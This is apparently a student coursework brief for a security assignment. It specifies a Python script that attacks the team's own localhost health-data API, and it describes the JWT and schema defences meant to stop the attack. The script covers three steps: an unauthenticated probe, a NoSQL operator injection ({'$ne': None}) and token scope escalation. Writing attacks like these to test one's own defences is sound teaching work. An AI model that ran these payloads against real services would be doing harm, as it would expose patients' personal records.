# Attack 2 — NoSQL Injection & Unauthorised Exfiltration (YYX)

**Folder:** `attack/`  
**File to write:** `attack/attack2_nosql.py`  
**Owner:** YYX  
**Counter-defence:** ZYM's Pydantic schema (`cloud_schema.py`) + JWT middleware (`cloud_auth.py`)

---

## 🎯 What this attack must demonstrate (CW1 requirements)

Three sub-attacks forming the chain:

| Sub-attack | What the attacker does | Expected outcome without defence |
|-----------|------------------------|----------------------------------|
| **A2.1 Unauthenticated probe** | Hit `/readings` without a token | Full record dump |
| **A2.2 NoSQL operator injection** | POST `{"patient_id": {"$ne": null}, ...}` against `/readings` or `/ingest` | MongoDB interprets `$ne` as a query and returns all records |
| **A2.3 Scope escalation** | Use an ingest-only token to hit a read endpoint | Read access granted — privilege escalation |

---

## 🛠️ How to implement it

```python
import requests

BASE = "http://localhost:5000"

# A2.1 — no auth at all
r = requests.get(f"{BASE}/readings")
print("A2.1", r.status_code, r.text[:200])

# A2.2 — operator injection
r = requests.post(f"{BASE}/ingest",
                  json={"patient_id": {"$ne": None},
                        "timestamp": 1713355200,
                        "heart_rate": 75.0})
print("A2.2", r.status_code, r.text[:200])

# A2.3 — scope escalation
tok = requests.post(f"{BASE}/enroll",
                    json={"device_id": "dev-A2"}).json()["token"]
H = {"Authorization": f"Bearer {tok}"}
r = requests.get(f"{BASE}/readings", headers=H)
print("A2.3", r.status_code, r.text[:200])
```

---

## 📜 Attack chain analysis (for CW1 Page 5)

1. Adversary position: internet, no prior credential
2. Reconnaissance: probe common endpoints (`/readings`, `/ingest`, `/api/v1/...`)
3. Payload crafting: discover MongoDB backend (HTTP headers, error messages); craft NoSQL operators
4. Exploitation: retrieve entire patient collection
5. Impact: GDPR Article 4(1) personal-data breach; notification to supervisory authority within 72 h; potential fine up to 4 % of global annual turnover

---

## 📸 Artifacts to capture

- [ ] Screenshot: unauthenticated dump succeeds against a dev build with defences off
- [ ] Screenshot: dev build returns thousands of records to the `$ne` injection
- [ ] Screenshot: attack payload raw JSON

---

## 🧱 After ZYM's defence is live (validation)

Rerun all three sub-attacks. Expected:
- A2.1 → **401** (JWT middleware)
- A2.2 → **400 schema_violation** (Pydantic rejects dict-valued fields)
- A2.3 → **401 forbidden_scope** (JWT scope check)

Capture these rejection screenshots — they are what CW2 Page 3 shows.

---

## ✅ Done when

- [ ] `attack/attack2_nosql.py` runs end-to-end
- [ ] All three sub-attacks succeed against the undefended API
- [ ] All three sub-attacks fail against the defended API with the correct status codes
- [ ] Six screenshots captured (3 attack-succeeds + 3 attack-blocked)
- [ ] Risk entry in `docs/RISK_MATRIX.md` filled in
